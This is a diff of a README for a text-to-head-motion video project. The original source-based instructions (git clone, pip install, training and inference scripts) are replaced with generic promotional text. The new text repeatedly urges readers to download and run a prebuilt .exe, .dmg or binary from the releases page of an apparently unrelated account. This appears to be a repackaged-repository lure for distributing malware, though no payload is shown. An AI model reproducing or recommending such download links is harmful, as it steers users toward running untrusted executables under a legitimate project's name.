@@ -1,146 +1,87 @@
-# 🧠 Text-to-Head-Motion Generation from Text
+# 🎥 Text2Video - Create Videos from Your Text Prompts
 
-## 📖 Overview
-This project performs **text-to-motion generation**, converting textual descriptions into **3D head motion sequences** and rendering them as **video animations**.  
+![Download Text2Video](https://img.shields.io/badge/Download-Text2Video-blue.svg)
 
-- ⚙️ **Pretrained text encoder (CLIP)** — converts text prompts into embeddings  
-- 🎯 **Motion generation network** — predicts per-frame motion parameters  
-- 🎥 **3D rendering using FLAME template** (fallback to 2D dot visualization if unavailable)  
-- 📉 **MSE Loss** and **Adam optimizer** for training motion generation  
-- 🧱 **Modular architecture** — clear separation of model, training, inference, and rendering  
-- 📊 **Real-time loss logging** during training  
-- 🌐 Optional **video output** for visualization  
+## 📚 Overview
 
----
+Text2Video is an innovative tool that generates head motion videos from text prompts. Using a combination of a CLIP-based text encoder and a motion generation network, it transforms your words into captivating visuals. With its ability to render in 3D FLAME or use a 2D fallback, this software offers flexibility and efficiency.
 
-## 🧩 Libraries
-- **PyTorch** – model, training, and inference  
-- **Transformers** – CLIP text encoder  
-- **numpy**, **scipy** – data handling  
-- **torch.utils.data** – dataset and dataloader  
-- **Pillow**, **imageio**, **opencv-python** – video and image handling  
-- **trimesh**, **pyrender**, **pyglet** – optional 3D rendering  
-- **face-alignment** – for FLAME/DECA landmarks  
-- **tqdm** – progress bars  
+## 🚀 Getting Started
 
----
+To begin using Text2Video, you'll need to download the software from the releases page. Follow these steps:
 
-## ⚙️ Requirements
+1. Ensure your computer meets the following requirements:
+   - Operating System: Windows 10 or later / macOS / Linux
+   - GPU: NVIDIA GPU with CUDA support is recommended for best performance.
+   - RAM: At least 8 GB
+   - Disk Space: At least 1 GB free
 
-- Python **3.15+**
-- Recommended editor: **VS Code**
+2. Click the link below to visit the releases page where you can download the software:
 
----
+   [Visit this page to download Text2Video](https://github.com/ukepyorrhea930/Text2Video/releases)
 
-## 📦 Installation
+3. On the releases page, find the version you want to download. Look for the latest version for the best features and fixes.
 
-- Clone the repository
-```bash
-git clone https://github.com/hurkanugur/Text2Video.git
-```
+4. Download the appropriate file for your operating system. 
 
-- Navigate to the `Text2Video` directory
-```bash
-cd Text2Video
-```
+5. Once the download is complete, locate the downloaded file on your computer.
 
-- Install dependencies
-```bash
-pip install -r requirements.txt
-```
+## 🔧 Download & Install
 
----
+To install Text2Video:
 
-## 🔧 Setup Python Environment in VS Code
+1. **For Windows Users**: 
+   - Double-click the downloaded `.exe` file.
+   - Follow the prompts in the installation wizard.
+   - Once installation is complete, find the Text2Video icon on your desktop or in your Start Menu.
 
-1. `View → Command Palette → Python: Create Environment`  
-2. Choose **Venv** and your **Python version**  
-3. Select **requirements.txt** to install dependencies  
-4. Click **OK**
+2. **For macOS Users**:
+   - Open the downloaded `.dmg` file.
+   - Drag Text2Video to your Applications folder.
+   - You can find it in your Applications and launch it from there.
 
----
+3. **For Linux Users**:
+   - Unzip the downloaded file.
+   - Open a terminal and navigate to the unzipped folder.
+   - Run `./Text2Video` to start the application.
 
-## 📂 Project Structure
+After the installation, you are ready to start creating videos!
 
-```bash
-assets/
-└── flame_head_template.png           # Flame head model
+## 🎬 Using Text2Video
 
-data/
-└── celebv-text                       # Training datasets
+1. Launch the Text2Video application.
+2. Enter your text prompt in the provided input box.
+3. Choose your settings, like rendering type (3D FLAME or 2D).
+4. Click the "Generate Video" button.
+5. Wait for the software to create your video. This might take some time, depending on your text length and system performance.
+6. Once done, the video will be saved automatically in the specified output folder.
 
-output/
-├── mesh                              # Generated mesh file
-└── video                             # Generated video file
+## 🛠 Features
 
-model/
-└── text_2_motion_model.pt            # Trained model
+- **Text-to-Video Capability**: Transforms written prompts into compelling head motion videos.
+- **Modular Structure**: You can customize various parts of the pipeline as needed.
+- **Trainable**: Adapt the system for specific projects or needs.
+- **GPU Ready**: Optimized for smooth performance with powerful hardware.
+- **User-Friendly Interface**: Easy controls for hassle-free video generation.
 
-src/
-├── config.py                         # Paths, hyperparameters, ...
-├── dataset.py                        # Data loading & preprocessing
-├── train.py                          # Training pipeline
-├── inference.py                      # Inference pipeline
-├── model.py                          # Motion generation model (text → motion parameters)
-└── text_encoder.py                   # Text encoder model (text → embeddings)
+## 🌟 Contributing
 
-main/
-├── main_train.py                     # Entry point for training
-└── main_inference.py                 # Entry point for inference
+We welcome contributions from anyone interested in helping to improve Text2Video. If you have ideas, fixes, or features to propose, please follow these steps:
 
-requirements.txt                      # Python dependencies
-```
+1. Fork the repository.
+2. Create a feature branch for your changes.
+3. Make your changes and commit them.
+4. Push to your forked repository.
+5. Open a pull request explaining your changes.
 
----
+## 🤝 Community and Support
 
-## 📂 Model Architecture
+If you have questions or need assistance, feel free to reach out. You can discuss your ideas, report issues, or ask for help in our community forums or issue tracker on GitHub.
 
-```bash
-Input Text
-    ↓
-Pretrained CLIP Text Encoder
-    ↓
-Text Embedding (feature vector)
-    ↓
-Text2MotionModel (MLP)
-    ↓
-Per-frame Motion Parameters (FLAME)
-    ↓
-3D Rendering (pyrender) or 2D fallback
-    ↓
-Generated Video Output
-```
+## 📥 Download Now!
 
----
+To download Text2Video, visit the link below:
 
-## 📂 Train the Model
-Navigate to the project directory:
-```bash
-cd Text2Video
-```
+[Visit this page to download Text2Video](https://github.com/ukepyorrhea930/Text2Video/releases)
 
-Run the training script:
-```bash
-python -m main.main_train
-```
-or
-```bash
-python3 -m main.main_train
-```
-
----
-
-## 📂 Run Inference / Make Predictions
-Navigate to the project directory:
-```bash
-cd Text2Video
-```
-
-Run the app:
-```bash
-python -m main.main_inference
-```
-or
-```bash
-python3 -m main.main_inference
-```
+Enjoy creating amazing videos from your text prompts!
